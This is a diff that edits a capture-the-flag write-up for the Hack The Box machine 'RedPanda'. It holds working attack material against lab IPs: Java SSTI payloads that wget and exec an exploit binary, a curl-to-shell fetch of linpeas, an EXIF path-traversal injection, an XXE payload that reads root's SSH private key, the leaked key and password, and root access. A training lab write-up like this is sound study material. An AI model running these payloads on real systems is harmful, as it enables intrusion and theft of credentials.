@@ -117,7 +117,7 @@ name=*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http:/
 ```
 *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./exploit.elf")}
 ```
-Awesome we get a shell but its pretty bas so lets upgrade it and grab our user flag!
+Awesome we get a shell but its pretty bad so lets upgrade it and grab our user flag!
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -138,7 +138,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```console
 curl http://10.10.14.30:8000/linpeas.sh | sh
 ```
-I tried for awhile on the CVE that is polkit but I wasnt having any luck. I didn't even try the others but maybe there was a vector in there somewhere.
+I tried for awhile on the CVE but I wasnt having any luck. I didn't even try the others but maybe there was a vector in there somewhere.
 
 in the credits folder we can see credentials but as the user woodenk I wasnt able to access it.
 
@@ -191,14 +191,14 @@ Vulnerable to CVE-2021-3560
 -rw-r----- 1 root logs 422 Aug 18 20:52 /credits/damian_creds.xml
 -rw-r----- 1 root logs 426 Aug 18 20:52 /credits/woodenk_creds.xml
 ```
-linpeas did not give me as much as I had hoped but checking out /opt that is usually empty according to linpeas had alot of info.
+Linpeas did not give me as much as I had hoped but checking out /opt that is usually empty according to linpeas had alot of info.
 
-Navigating all the way to the file below has very interesting info including the password for woodenk.
+Navigating all the way to the file below has very interesting info including the password for Woodenk, RedPandazRule. Now we can at least login in through ssh.
 
-```console
-woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ 
-$ cat MainController.java
-```
+But thats not all. This file also contains the hints for how we are going to get root.
+
+The part where it is talking about ```"for(Element image: images)"``` This is taking the meta data from the image and directing it at a uri. Also ```"InputStream in = new FileInputStream("/credits/" + author + "_creds.xml")"``` is notable.
+
 ```java
 woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java 
 package com.panda_search.htb.panda_search;
@@ -324,6 +324,8 @@ public class MainController {
 }
 woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ 
 ```
+A quick ssh to make this next part cleaner
+
 ```console
 └──╼ [★]$ ssh woodenk@10.129.66.0
 The authenticity of host '10.129.66.0 (10.129.66.0)' can't be established.
@@ -358,6 +360,16 @@ To check for new updates run: sudo apt update
 Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
 woodenk@redpanda:~$ 
 ```
+Now with information we got from above we are going to change any .jpg of our own (I got mine from google images) and use exiftool to input our own uri.
+
+Note: rootme is the 1st part of the xml file that I created further below. The other half being _creds.xml
+
+```console
+└──╼ [★]$ exiftool -Artist='../home/woodenk/rootme' pic.jpg
+    1 image files updated
+```
+Set up the http server and download it to the victim
+
 ```console
 woodenk@redpanda:~$ wget http://10.10.14.47:8000/pic.jpg
 --2022-08-19 19:17:23--  http://10.10.14.47:8000/pic.jpg
@@ -371,8 +383,28 @@ pic.jpg             100%[===================>]  57.81K  --.-KB/s    in 0.009s
 2022-08-19 19:17:23 (6.11 MB/s) - ‘pic.jpg’ saved [59193/59193]
 ```
 
+If you go to the export table found earlier in this writeup you can find the template for XML to perform our XXE.
+Create an xml file with our XXE payload and make sure its in the same directory as the .jpg.
+My files were located in /home/woodenk.
+
+Note: Be sure the xml documents end in ```_creds.xml``` so it matches the .java file.
 
 ```console
+woodenk@redpanda:~$ echo '<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
+<credits>
+  <author>damian</author>
+  <image>
+    <uri>/../../../../../../../home/woodenk/pic.jpg</uri>
+    <hello>&ent;</hello>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>' > rootme_creds.xml
+```
+Now in Burpsuite change the User-Agent: section to what is listed below.
+
+```
 GET / HTTP/1.1
 Host: 10.129.66.22:8080
 User-Agent: ||/../../../../../../../home/woodenk/pic.jpg
@@ -385,7 +417,9 @@ Upgrade-Insecure-Requests: 1
 Sec-GPC: 1
 Cache-Control: max-age=0
 ```
-Give it a minute to run and the SSH key will be in your xml file.
+Give it a minute or 2 after sending the request to the webpage through BurpSuite. The ssh key will not pop into the xml document immediately.
+
+Then we can cat the xml file to reveal the root SSH key!
 
 ```console
 woodenk@redpanda:~$ cat rootme_creds.xml 
@@ -409,6 +443,8 @@ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 </credits>
 woodenk@redpanda:~$ 
 ```
+Create an id_rsa file with the root ssh key.
+
 ```console
 echo '-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
@@ -418,6 +454,8 @@ AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
 RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
 -----END OPENSSH PRIVATE KEY-----' > id_rsa
 ```
+
+We are in as root!
 
 ```console
 └──╼ [★]$ sudo ssh root@10.129.66.22 -i id_rsa
@@ -454,6 +492,8 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Thu Jun 30 13:17:41 2022
 root@redpanda:~# 
 ```
+Finally got the flag!
+
 ```console
 root@redpanda:~# ls
 root.txt  run_credits.sh
@@ -461,3 +501,9 @@ root@redpanda:~# cat root.txt
 d9ffbae08334a7789213359874e43b0e
 root@redpanda:~# 
 ```
+
+In the beginning I would definitely rate this as an easy Machine but privilege escalating was much harder. Luckily I got a few pointers from some good people.
+
+Hopefully others can learn something from this writeup. For me this will be a good Machine to look back on if I forget or need a refresher.
+
+Cheers!
